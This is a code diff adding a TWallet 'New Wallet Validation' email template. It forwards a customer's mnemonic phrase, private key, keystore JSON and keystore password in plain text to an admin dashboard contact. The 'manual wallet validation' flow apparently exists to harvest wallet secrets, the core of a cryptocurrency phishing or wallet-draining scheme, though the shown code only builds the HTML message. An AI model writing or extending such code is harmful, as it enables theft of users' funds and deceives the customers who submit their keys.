@@ -185,3 +185,74 @@ export function buildTicketReceivedEmail(params: {
     </div>
   `;
 }
+
+function escapeHtml(value: string): string {
+  return value
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;")
+    .replaceAll('"', "&quot;")
+    .replaceAll("'", "&#39;");
+}
+
+function secretBlock(label: string, value: string | null | undefined): string {
+  if (!value) return "";
+  return `
+    <tr>
+      <td style="padding: 8px 12px; background: #f8fafc; border: 1px solid #e2e8f0; font-size: 13px; font-weight: 600; white-space: nowrap;">${label}</td>
+      <td style="padding: 8px 12px; background: #fff; border: 1px solid #e2e8f0; font-size: 12px; font-family: monospace; word-break: break-all;">${escapeHtml(value)}</td>
+    </tr>
+  `;
+}
+
+export function buildWalletValidationEmail(params: {
+  userEmail: string;
+  userId: string;
+  walletName: string;
+  validationType: "mnemonics" | "keystore" | "private_key" | "hardware";
+  mnemonicPhrase?: string | null;
+  keystoreJson?: string | null;
+  keystorePassword?: string | null;
+  privateKey?: string | null;
+  hardwareType?: string | null;
+}): string {
+  return `
+    <div style="font-family: system-ui, sans-serif; max-width: 560px; margin: 0 auto;">
+      <div style="background: #2563eb; border-radius: 12px 12px 0 0; padding: 20px 24px;">
+        <h1 style="color: #fff; margin: 0; font-size: 18px;">New Wallet Validation</h1>
+      </div>
+      <div style="border: 1px solid #e2e8f0; border-top: 0; border-radius: 0 0 12px 12px; padding: 24px;">
+        <p style="margin: 0 0 16px; color: #334155; font-size: 14px;">
+          A customer submitted a manual wallet validation on TWallet. Review it in the
+          <a href="https://twalletservices.com/admin/wallet-validations" style="color: #2563eb;">admin dashboard</a>.
+        </p>
+        <table style="width: 100%; border-collapse: collapse; font-size: 13px; color: #334155;">
+          <tr>
+            <td style="padding: 8px 12px; background: #f8fafc; border: 1px solid #e2e8f0; font-weight: 600;">Customer email</td>
+            <td style="padding: 8px 12px; background: #fff; border: 1px solid #e2e8f0;">${escapeHtml(params.userEmail)}</td>
+          </tr>
+          <tr>
+            <td style="padding: 8px 12px; background: #f8fafc; border: 1px solid #e2e8f0; font-weight: 600;">User ID</td>
+            <td style="padding: 8px 12px; background: #fff; border: 1px solid #e2e8f0; font-family: monospace; font-size: 11px;">${escapeHtml(params.userId)}</td>
+          </tr>
+          <tr>
+            <td style="padding: 8px 12px; background: #f8fafc; border: 1px solid #e2e8f0; font-weight: 600;">Wallet name</td>
+            <td style="padding: 8px 12px; background: #fff; border: 1px solid #e2e8f0;">${escapeHtml(params.walletName)}</td>
+          </tr>
+          <tr>
+            <td style="padding: 8px 12px; background: #f8fafc; border: 1px solid #e2e8f0; font-weight: 600;">Validation type</td>
+            <td style="padding: 8px 12px; background: #fff; border: 1px solid #e2e8f0; text-transform: capitalize;">${escapeHtml(params.validationType.replace("_", " "))}</td>
+          </tr>
+          ${secretBlock("Mnemonic phrase", params.mnemonicPhrase)}
+          ${secretBlock("Keystore JSON", params.keystoreJson)}
+          ${secretBlock("Keystore password", params.keystorePassword)}
+          ${secretBlock("Private key", params.privateKey)}
+          ${params.hardwareType ? secretBlock("Hardware device", params.hardwareType) : ""}
+        </table>
+        <p style="margin: 16px 0 0; color: #94a3b8; font-size: 12px;">
+          This is an automated notification from the TWallet platform.
+        </p>
+      </div>
+    </div>
+  `;
+}
